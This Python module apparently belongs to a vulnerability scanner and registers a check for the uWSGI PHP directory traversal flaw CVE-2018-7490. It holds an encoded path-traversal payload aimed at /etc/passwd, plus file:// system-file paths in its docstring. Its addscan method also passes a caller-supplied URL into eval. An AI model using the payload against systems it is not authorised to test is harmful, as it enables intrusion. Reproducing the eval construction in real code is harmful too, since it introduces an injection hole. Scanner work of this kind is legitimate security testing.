#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
uWSGI是一款Web应用程序服务器, 它实现了WSGI、uwsgi和http等协议, 并支持通过插件来运行各种语言
    uWSGI PHP扫描类: 
        uWSGI PHP目录穿越漏洞
            CVE-2018-7490
                Payload: https://vulhub.org/#/environments/uwsgi/CVE-2018-7490/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
from payloads.uWSGIPHP.cve_2018_7490 import cve_2018_7490_scan

class uWSGI_PHP():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'uWSGI-PHP'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_7490_payloads = [
            {
                'path': '..%2f..%2f..%2f..%2f..%2fetc/passwd',
                'data': ''
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_7490_scan, url=url)
        ]

uWSGI_PHP.cve_2018_7490_scan = cve_2018_7490_scan

uwsgiphp = uWSGI_PHP()
